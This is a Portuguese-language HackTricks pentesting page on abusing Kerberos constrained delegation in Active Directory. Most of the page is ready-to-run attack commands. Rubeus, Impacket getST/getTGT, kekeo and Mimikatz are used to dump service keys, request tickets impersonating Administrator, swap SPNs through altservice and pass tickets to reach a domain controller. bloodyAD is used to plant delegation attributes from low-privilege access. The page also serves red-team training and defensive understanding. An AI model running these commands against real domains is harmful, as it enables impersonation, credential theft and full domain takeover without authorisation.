# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Usando isso, um Domain admin pode **permitir** que um computador **se passe por um usuário ou computador** perante qualquer **serviço** de uma máquina.

- **Service for User to self (_S4U2self_):** Se uma **service account** tiver um valor _userAccountControl_ contendo [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), então ela pode obter um TGS para si mesma (o serviço) em nome de qualquer outro usuário.
- **Service for User to Proxy(_S4U2proxy_):** Uma **service account** pode obter um TGS em nome de qualquer usuário para o serviço definido em **msDS-AllowedToDelegateTo.** Para isso, primeiro precisa de um TGS desse usuário para si mesma, mas pode usar S4U2self para obter esse TGS antes de solicitar o outro.

**Nota**: Se um usuário estiver marcado como ‘_Account is sensitive and cannot be delegated_ ’ no AD, você **não poderá impersoná-lo**.

Isso significa que se você **comprometer o hash do serviço** você pode **se passar por usuários** e obter **acesso** em nome deles a qualquer **serviço** nas máquinas indicadas (possível **privesc**).

Além disso, você **não terá acesso apenas ao serviço que o usuário pode impersonar, mas também a qualquer serviço** porque o SPN (o nome do serviço requisitado) não é verificado (no ticket essa parte não é criptografada/assinada). Portanto, se você tem acesso ao **CIFS service** você também pode ter acesso ao **HOST service** usando a flag `/altservice` no Rubeus, por exemplo. A mesma falha de troca de SPN é explorada pelo **Impacket getST -altservice** e outras ferramentas.

Além disso, o **acesso ao LDAP service no DC** é o que é necessário para explorar um **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Notas sobre constrained delegation entre domínios (2025+)

Desde **Windows Server 2012/2012 R2** o KDC suporta **constrained delegation across domains/forests** por meio das extensões S4U2Proxy. Builds modernas (Windows Server 2016–2025) mantêm esse comportamento e adicionam dois PAC SIDs para sinalizar a transição de protocolo:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) quando o usuário autenticou normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) quando um serviço afirmou a identidade por meio da transição de protocolo.

Espere `SERVICE_ASSERTED_IDENTITY` dentro do PAC quando a transição de protocolo for usada entre domínios, confirmando que o passo S4U2Proxy teve sucesso.

### Impacket / ferramentas Linux (altservice & full S4U)

Versões recentes do Impacket (0.11.x+) expõem a mesma S4U chain e SPN swapping que o Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Se você prefere forjar o ST do usuário primeiro (por exemplo, apenas hash offline), combine **ticketer.py** com **getST.py** para S4U2Proxy. Consulte a issue aberta do Impacket #1713 para as peculiaridades atuais (KRB_AP_ERR_MODIFIED quando o ST forjado não corresponder à chave SPN).

### Automatizando a configuração de delegação a partir de low-priv creds

Se você já possui **GenericAll/WriteDACL** sobre uma conta de computador ou conta de serviço, pode aplicar os atributos necessários remotamente sem RSAT usando **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Isto permite que você construa um caminho de constrained delegation para privesc sem privilégios DA assim que puder escrever esses atributos.

- Passo 1: **Obter TGT do serviço permitido**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Existem **outras maneiras de obter um TGT ticket** ou o **RC4** ou **AES256** sem ser SYSTEM no computador, como o Printer Bug, unconstrain delegation, NTLM relaying e Active Directory Certificate Service abuse
>
> **Apenas tendo esse TGT ticket (ou hashed) você pode realizar este ataque sem comprometer todo o computador.**

- Passo 2: **Obter o TGS para o serviço se passando pelo usuário**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Referências
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
